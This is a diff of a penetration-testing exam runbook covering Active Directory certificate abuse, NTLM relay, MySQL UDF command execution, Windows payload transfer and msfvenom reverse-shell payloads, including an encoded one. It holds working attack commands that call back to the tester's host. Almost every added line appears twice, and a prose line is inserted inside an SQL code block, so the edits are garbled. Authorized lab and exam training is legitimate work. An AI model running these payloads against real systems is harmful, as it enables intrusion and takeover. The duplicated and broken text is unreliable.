@@ -14,7 +14,7 @@ first, with all detailed explanations in the later appendix.
 | Discovery recorded                                    | **NET-05**: identify and prioritize actual services, not port labels alone.                                                                                                                | Open **one matching service branch** below.                                                                                                                                                                              |
 | Permitted SSH account or key for an observed endpoint | **SSH-01 → SSH-02**: verify the host key before login, then verify the assigned host and effective identity inside the session.                                                            | A verified Linux shell goes to **LNX-01**; a verified Windows shell goes to **WIN-01**. Denied or unverified access returns to the observed-service route.                                                               |
 | Verified Linux shell                                  | **LNX-01 → LNX-03**: keep the host and effective identity, then check only the delegated commands that can change the next action.                                                         | Skip namespace diagnostics unless root, restriction or container evidence makes them relevant. Continue to the exact permission or application lead, then reassess or capture proof.                                     |
-| A concrete lead is found                              | Continue the matching service branch: read the relevant file, inspect the application or authenticate with permitted credentials. Use **EXP-01** only when selecting an exploit candidate. | A resulting session goes to **EXP-03** unless the service branch already verified host and identity. Failed or exhausted leads go to another observed lead or record the specific missing fact before changing branches. |
+| A concrete lead is found                              | Continue the matching service branch: read the relevant file, inspect the application or authenticate with permitted credentials. Use **EXP-01** only when selecting an exploit candidate. | A resulting session goes to **EXP-03** unless the service branch already verified host and identity. A domain credential or graph right opens **AD-09** or **ADCS-01** instead. A domain credential or graph right opens **AD-09** or **ADCS-01** instead. Failed or exhausted leads go to another observed lead or record the specific missing fact before changing branches. |
 | Usable session verified                               | **LNX-01** or **WIN-01** according to the actual host; **AD-01** when domain context is assigned or observed.                                                                              | Follow only the permission, identity or objective leads the host provides.                                                                                                                                               |
 | Objective reached or route exhausted                  | Use the source step's exact objective proof and cleanup instructions.                                                                                                                      | Keep the output tied to host and identity; record any unresolved cleanup or next question. Do not infer completion from a tool success line.                                                                             |
 
@@ -1189,6 +1189,10 @@ KRB5CCNAME='<CCACHE>' impacket-mssqlclient -windows-auth -k -no-pass '<DOMAIN>/<
 
 # adcs
 
+`certipy-ad` is a Kali package; keep issued PFX files in a private directory.
+
+`certipy-ad` is a Kali package; keep issued PFX files in a private directory.
+
 ADCS is a certificate-service path on the domain controller. Use only on an authorized disposable set.
 
 ## ADCS-01. Is a CA reachable and which templates are vulnerable?
@@ -1313,6 +1317,10 @@ Remove `agent.pfx` and the issued `.pfx` afterwards.
 
 ## ADCS-08. Is an Any-Purpose template available (ESC2)?
 
+**Optional.** Safe to skip under exam time pressure.
+
+**Optional.** Safe to skip under exam time pressure.
+
 Enter when ADCS-01 flags ESC2 and you can enrol.
 
 ```bash
@@ -1328,6 +1336,10 @@ An Any-Purpose certificate authenticates as you for any service. For another pri
 | Enrol denied | **ADCS-01**. |
 
 ## ADCS-09. Is the CA object or RPC interface controllable (ESC5/ESC11)?
+
+**Optional.** Safe to skip under exam time pressure.
+
+**Optional.** Safe to skip under exam time pressure.
 
 ESC5 needs write rights on the CA object or its configuration. Check with the find output, then grant yourself officer:
 
@@ -1345,6 +1357,10 @@ ESC11 relays NTLM to the CA's RPC interface, so use **RELAY-02** with `-t 'http:
 
 ## ADCS-10. Is certificate mapping weak (ESC9/ESC10)?
 
+**Optional.** Safe to skip under exam time pressure.
+
+**Optional.** Safe to skip under exam time pressure.
+
 With strong mapping disabled, request a certificate carrying the target UPN, then authenticate with the target name:
 
 ```bash
@@ -1358,6 +1374,10 @@ certipy-ad auth -pfx administrator.pfx -username administrator -domain '<DOMAIN>
 | Mapping still strong | Use **ADCS-02** with a subject-enabled template. |
 | Auth fails | **PAUSE-COVERAGE**; check the UPN and CA name. |
 # ad_abuse
+
+Stage Responder, impacket, `PetitPotam.py` and `printerbug.py` from Kali or GitHub; `dnstool.py` is part of krbrelayx.
+
+Stage Responder, impacket, `PetitPotam.py` and `printerbug.py` from Kali or GitHub; `dnstool.py` is part of krbrelayx.
 
 Coercion, relay, delegation and domain trusts. Each task assumes a validated domain identity and an attributed target.
 
@@ -1810,6 +1830,10 @@ After SSH work, exit your shells, recheck the route and send the actual closing 
 
 # windows_privilege
 
+Stage the reviewed driver/loader, Incognito, UACME and SharpDPAPI binaries.
+
+Stage the reviewed driver/loader, Incognito, UACME and SharpDPAPI binaries.
+
 Disposable lab with a reset. WIN-01 must confirm host and architecture, WIN-07 both policy hives.
 
 ## WPRIV-01. Does the enabled installer policy yield the intended Windows token?
@@ -2224,6 +2248,10 @@ rm -i snmp.txt
 
 # database
 
+`odat` comes from GitHub and `lib_mysqludf_sys` from its source tree.
+
+`odat` comes from GitHub and `lib_mysqludf_sys` from its source tree.
+
 Confirm the engine from its response before picking a client. One supplied identity per endpoint.
 
 ## DB-01. Can the assigned identity establish a database session?
@@ -2345,6 +2373,10 @@ Or decode the hex locally: `printf '%s' '<HEX>' | xxd -r -p | head -c 4096 | cat
 
 ## DB-12. Can MySQL load a UDF?
 
+**Optional.** Safe to skip under exam time pressure.
+
+**Optional.** Safe to skip under exam time pressure.
+
 Enter with `FILE` privilege and a writable plugin directory.
 
 ```sql
@@ -2357,6 +2389,8 @@ Upload `lib_mysqludf_sys.so` (or the matching `.dll`) with:
 
 ```sql
 SELECT 0x<HEX> INTO DUMPFILE '<PLUGIN_DIR>/lib_mysqludf_sys.so';
+Generate `<HEX>` on Kali with `xxd -p lib_mysqludf_sys.so | tr -d '\n'`.
+Generate `<HEX>` on Kali with `xxd -p lib_mysqludf_sys.so | tr -d '\n'`.
 CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';
 SELECT sys_exec('id > /tmp/owb');
 ```
@@ -2456,6 +2490,10 @@ For database ownership, check `IS_MEMBER('db_owner')` and `EXECUTE AS USER = 'db
 | No right | **DB-02** for another lead. |
 
 ## DB-10. Are linked servers reachable?
+
+**Optional.** Safe to skip under exam time pressure.
+
+**Optional.** Safe to skip under exam time pressure.
 
 ```sql
 EXEC sp_linkedservers;
@@ -2599,6 +2637,10 @@ whoami
 Continue with the Windows token check at [WIN-01](./win-01.md).
 
 # other_services
+
+`vncpasswd.py` is not stock Kali.
+
+`vncpasswd.py` is not stock Kali.
 
 Service-specific paths that NET-05 can select.
 
@@ -2781,7 +2823,19 @@ proxychains -f proxychains.conf curl -sS 'http://<INTERNAL_HOST>/'
 
 ## GENERIC-01. Unfamiliar service, what now?
 
+**Optional.** Safe to skip under exam time pressure.
+
+**Optional.** Safe to skip under exam time pressure.
+
 1. Read the banner and confirm the protocol at **NET-03**.
+
+```bash
+nc -nv '<TARGET_IP>' '<PORT>'
+```
+
+```bash
+nc -nv '<TARGET_IP>' '<PORT>'
+```
 2. Take the exact product and version.
 3. `searchsploit --disable-colour '<PRODUCT>' '<VERSION>'`, `searchsploit -m <EDB_ID>`.
 4. Read the header, then check each prerequisite at **EXP-01**.
@@ -3114,6 +3168,10 @@ python3 -c 'import sys; print(chr(int(sys.argv[1])))' '<CODE>'
 
 # web_upload
 
+`uploadserver` is a pipx package, not stock Kali.
+
+`uploadserver` is a pipx package, not stock Kali.
+
 Test only new files. Keep the exact file field, required fields, record view and delete action.
 
 ## WUPLOAD-01. Where did one ordinary uploaded file land?
@@ -3223,6 +3281,10 @@ Restore before closing: paste `original.php` back, save once, re-read, compare w
 | Restore mismatch or broken page | **PAUSE-RECOVERY** with the out-of-band route. |
 
 # web_advanced
+
+`php_filter_chain_generator` and `uploadserver` are staged tools.
+
+`php_filter_chain_generator` and `uploadserver` are staged tools.
 
 Each task needs a verified input or endpoint from WEB-06/08/12.
 
@@ -3561,6 +3623,10 @@ Windows token work continues at [WIN-01](./win-01.md).
 
 # shell_transfer
 
+Windows transfer uses built-in `certutil`/`bitsadmin`; `uploadserver` is pipx-installed on Kali.
+
+Windows transfer uses built-in `certutil`/`bitsadmin`; `uploadserver` is pipx-installed on Kali.
+
 PTY recovery and reviewed file transfer.
 
 ## SHELL-01. Can an existing socket shell become a usable target PTY?
@@ -3675,6 +3741,8 @@ Invoke-WebRequest 'http://<KALI_IP>:<PORT>/payload.exe' -OutFile 'C:\Windows\Tem
 ```
 
 SMB is the fallback when HTTP egress is blocked: `impacket-smbserver owb . -smb2support`, then `copy \\<KALI_IP>\owb\payload.exe C:\Windows\Temp\`.
+Base64 fallback over an existing shell: `[IO.File]::WriteAllBytes('C:\Windows\Temp\payload.exe',[Convert]::FromBase64String('<B64>'))`.
+Base64 fallback over an existing shell: `[IO.File]::WriteAllBytes('C:\Windows\Temp\payload.exe',[Convert]::FromBase64String('<B64>'))`.
 
 | Result | Next |
 | --- | --- |
@@ -3717,6 +3785,10 @@ Delete the target copy only after the Kali copy is verified.
 
 # metasploit
 
+`msfconsole` and `msfvenom` are on Kali. The allowance is one target; note it on every attempt.
+
+`msfconsole` and `msfvenom` are on Kali. The allowance is one target; note it on every attempt.
+
 MSF is allowed on one target per exam attempt. Use manual paths first and spend the allowance where a module saves real time.
 
 ## MSF-01. Choose and review one module before use
@@ -3727,7 +3799,7 @@ search <PRODUCT> <VERSION>
 info <MODULE_NUMBER>
 ```
 
-Read the module's rank, target, payload, required options and side effects. `check` when the module supports it.
+Read the module's rank, target, payload, required options and side effects. `check` when the module supports it. Record the module path and version; rank tells you how reliable it is. Record the module path and version; rank tells you how reliable it is.
 
 | Result | Next |
 | --- | --- |
@@ -3747,7 +3819,7 @@ show options
 run
 ```
 
-Set only options with no default; review the payload, target index and architecture. Keep a separate manual listener if the module is staged.
+Set only options with no default; review the payload, target index and architecture. Keep a separate manual listener if the module is staged. This attempt consumes the allowance for one target. This attempt consumes the allowance for one target.
 
 | Result | Next |
 | --- | --- |
@@ -3756,6 +3828,10 @@ Set only options with no default; review the payload, target index and architect
 | No session | **EXP-02** with the raw output. |
 
 ## MSF-03. Use, route and clean up a session
+
+**Optional.** Safe to skip under exam time pressure.
+
+**Optional.** Safe to skip under exam time pressure.
 
 ```text
 sessions -l
@@ -3769,7 +3845,7 @@ route add <INTERNAL_SUBNET> <SESSION_ID>
 portfwd add -l <LOCAL_PORT> -p <REMOTE_PORT> -r <INTERNAL_HOST>
 ```
 
-`route` sends MSF modules through the session; `portfwd` exposes one TCP port. Neither is a system proxy.
+`route` sends MSF modules through the session; `portfwd` exposes one TCP port. Neither is a system proxy. Remove routes and forwards before killing the session. Remove routes and forwards before killing the session.
 
 | Result | Next |
 | --- | --- |
@@ -3780,6 +3856,10 @@ portfwd add -l <LOCAL_PORT> -p <REMOTE_PORT> -r <INTERNAL_HOST>
 Cleanup: remove forwards and routes (`portfwd delete`, `route remove`), kill the session, exit the console. Delete any module output you staged.
 
 # payloads
+
+`msfvenom` is on Kali. One foreground listener, then stop it.
+
+`msfvenom` is on Kali. One foreground listener, then stop it.
 
 ## PAY-01. Reverse or bind?
 
@@ -3804,6 +3884,8 @@ Bind when egress is blocked: the target listens, and you reach it through a tunn
 msfvenom -p windows/x64/shell_reverse_tcp LHOST='<KALI_IP>' LPORT='<LPORT>' -f exe -o payload.exe
 msfvenom -p linux/x64/shell_reverse_tcp LHOST='<KALI_IP>' LPORT='<LPORT>' -f elf -o payload.elf
 msfvenom -p java/jsp_shell_reverse_tcp LHOST='<KALI_IP>' LPORT='<LPORT>' -f war -o payload.war
+msfvenom -p windows/x64/shell_reverse_tcp LHOST='<KALI_IP>' LPORT='<LPORT>' -e x64/xor_dynamic -i 3 -f exe -o payload-enc.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST='<KALI_IP>' LPORT='<LPORT>' -e x64/xor_dynamic -i 3 -f exe -o payload-enc.exe
 file payload.exe
 sha256sum payload.exe
 ```
